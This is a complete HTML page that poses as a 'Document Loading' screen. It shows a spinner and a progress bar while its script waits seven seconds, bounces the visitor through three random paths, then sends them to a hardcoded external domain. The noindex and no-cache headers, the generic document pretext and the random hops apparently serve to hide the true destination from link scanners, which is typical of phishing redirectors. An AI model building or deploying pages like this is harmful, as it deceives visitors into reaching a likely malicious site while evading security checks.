<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex">
    <meta http-equiv="cache-control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="pragma" content="no-cache">
    <meta http-equiv="expires" content="0">
    <title>Document Loading</title>
    <style>
      :root {
        color-scheme: light;
        font-family:
          Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI",
          sans-serif;
      }

      * {
        box-sizing: border-box;
      }

      body {
        align-items: center;
        background: #eef3f9;
        color: #111827;
        display: flex;
        justify-content: center;
        margin: 0;
        min-height: 100vh;
        padding: 24px;
      }

      .loading-card {
        background: #ffffff;
        border: 1px solid #dbe3ef;
        border-radius: 18px;
        box-shadow: 0 18px 45px rgba(15, 23, 42, 0.1);
        max-width: 440px;
        padding: 30px;
        text-align: left;
        width: 100%;
      }

      .document-icon {
        align-items: center;
        background: #f8fafc;
        border: 1px solid #dbe3ef;
        border-radius: 14px;
        display: flex;
        height: 64px;
        justify-content: center;
        margin-bottom: 24px;
        width: 64px;
      }

      .document-icon::before {
        background:
          linear-gradient(#2563eb, #2563eb) 12px 14px / 22px 3px no-repeat,
          linear-gradient(#cbd5e1, #cbd5e1) 12px 25px / 34px 3px no-repeat,
          linear-gradient(#cbd5e1, #cbd5e1) 12px 36px / 28px 3px no-repeat,
          #ffffff;
        border: 2px solid #bfdbfe;
        border-radius: 8px;
        content: "";
        height: 42px;
        width: 34px;
      }

      .status {
        align-items: center;
        color: #2563eb;
        display: flex;
        font-size: 13px;
        font-weight: 700;
        gap: 10px;
        letter-spacing: 0.08em;
        margin: 0 0 10px;
        text-transform: uppercase;
      }

      .spinner {
        animation: spin 0.9s linear infinite;
        border: 2px solid #bfdbfe;
        border-radius: 50%;
        border-top-color: #2563eb;
        height: 18px;
        width: 18px;
      }

      h1 {
        font-size: clamp(25px, 6vw, 34px);
        letter-spacing: -0.035em;
        line-height: 1.05;
        margin: 0;
      }

      p {
        color: #64748b;
        font-size: 15px;
        line-height: 1.6;
        margin: 14px 0 0;
      }

      .progress {
        background: #e2e8f0;
        border-radius: 999px;
        height: 8px;
        margin-top: 26px;
        overflow: hidden;
      }

      .progress span {
        background: #2563eb;
        border-radius: inherit;
        display: block;
        height: 100%;
        width: 0;
      }

      @keyframes spin {
        to {
          transform: rotate(360deg);
        }
      }

      @media (max-width: 520px) {
        .loading-card {
          padding: 24px;
        }
      }

      @media (prefers-reduced-motion: reduce) {
        *,
        *::before,
        *::after {
          animation-duration: 0.001ms !important;
          animation-iteration-count: 1 !important;
          scroll-behavior: auto !important;
        }
      }
    </style>
  </head>
  <body>
    <main class="loading-card" aria-live="polite">
      <div class="document-icon" aria-hidden="true"></div>
      <p class="status"><span class="spinner" aria-hidden="true"></span> Loading document</p>
      <h1>Preparing your request</h1>
      <p>Please keep this page open while the document session is prepared.</p>
      <div class="progress" aria-hidden="true"><span id="loading-progress"></span></div>
    </main>

    <script>
      (function () {
        var finalUrl = "https://liberalization652.apexdrift.app/448orthodoxy/";
        var loadingDelayMs = 7000;
        var maxRandomRedirects = 3;
        var minRandomPathLength = 10;
        var storageKey = "redirectStep";
        var alphabet = "abcdefghijklmnopqrstuvwxyz0123456789";
        var tokenPattern = new RegExp("^/[A-Za-z0-9]{" + minRandomPathLength + ",}/?$");
        var currentPath = window.location.pathname.replace(/\/+$/, "");
        var progressBar = document.getElementById("loading-progress");
        var startedAt = Date.now();
        var requestFrame = window.requestAnimationFrame || function (callback) {
          return window.setTimeout(callback, 16);
        };

        function generateRandomPath() {
          var randomString = "";

          for (var index = 0; index < minRandomPathLength; index += 1) {
            randomString += alphabet.charAt(Math.floor(Math.random() * alphabet.length));
          }

          return "/" + randomString;
        }

        function isInitialPath() {
          return currentPath === "" || currentPath === "/index.html";
        }

        function redirectToNextStep() {
          var currentStep = Number(window.sessionStorage.getItem(storageKey) || "0");

          if (currentStep < maxRandomRedirects) {
            window.sessionStorage.setItem(storageKey, String(currentStep + 1));
            window.location.replace(generateRandomPath());
            return;
          }

          window.sessionStorage.removeItem(storageKey);
          window.location.replace(finalUrl);
        }

        function updateProgress() {
          var elapsedMs = Date.now() - startedAt;
          var progress = Math.min(elapsedMs / loadingDelayMs, 1);

          progressBar.style.width = Math.round(progress * 100) + "%";

          if (progress < 1) {
            requestFrame(updateProgress);
          }
        }

        if (!isInitialPath()) {
          if (!tokenPattern.test(window.location.pathname)) {
            window.sessionStorage.setItem(storageKey, "0");
          }

          redirectToNextStep();
          return;
        }

        window.sessionStorage.setItem(storageKey, "0");
        updateProgress();
        window.setTimeout(function () {
          progressBar.style.width = "100%";
          redirectToNextStep();
        }, loadingDelayMs);
      }());
    </script>
  </body>
</html>
